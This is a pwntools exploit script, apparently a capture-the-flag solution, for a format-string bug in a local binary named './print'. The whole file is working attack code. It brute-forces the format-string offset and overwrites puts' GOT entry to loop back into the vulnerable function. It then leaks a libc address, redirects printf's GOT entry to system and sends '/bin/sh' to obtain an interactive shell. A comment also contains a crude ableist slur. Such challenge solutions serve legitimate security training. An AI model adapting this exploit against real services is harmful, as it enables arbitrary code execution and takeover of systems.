from pwn import *
context.log_level = 'debug'
context.binary = binary = './print'
elf = ELF(binary)
libc = ELF('libc.so.6')
host, port = '127.0.0.1', 1337
def newp():
	if args.REMOTE:
		return remote(host, port)
	return process(elf.path)

def get_offset_fmtstr():
	i = 1
	while i < 50:
		p = newp()
		payload = b'AAAA' + b'%' + bytes(str(i),'utf-8') + b'$p'
		#change these based on problem
		p.sendline(payload)
		x = p.recvline()
		print(i,x)
		if b'41414141' in x:
			print(i)
			input() #better than return
			#return #this is commented because of a retarded challenge
		p.close()
		i+=1




puts_got = 0x404018
vuln = 0x4011b6
writes = {puts_got: vuln}


offset = 6
write_size = 'byte'
payload = fmtstr_payload(offset, writes=writes, write_size=write_size)

#change these based on chall
p = newp()
p.recvuntil(b'Gib: ')
p.sendline(payload)
#p.sendline(b'/bin/sh') #if you do the system overwrite
p.recvuntil(b'Gib: ')
p.sendline(b'%20$p %21$p %22$p %23$p %33$p %34$p %35$p %36$p %37$p')

leak = int(p.recvuntil(b'Gib:').split(b' ')[1],16)
print(leak)

#gdb.attach(p)

libc_base = leak - 0x11ba91

print(hex(libc_base))


system = libc_base + 0x0000000000058750



printf_got = 0x404030
vuln = 0x4011b6
writes = {printf_got: system}


offset = 6
write_size = 'byte'
payload = fmtstr_payload(offset, writes=writes, write_size=write_size)

p.sendline(payload)

p.sendline(b'/bin/sh')

p.interactive()
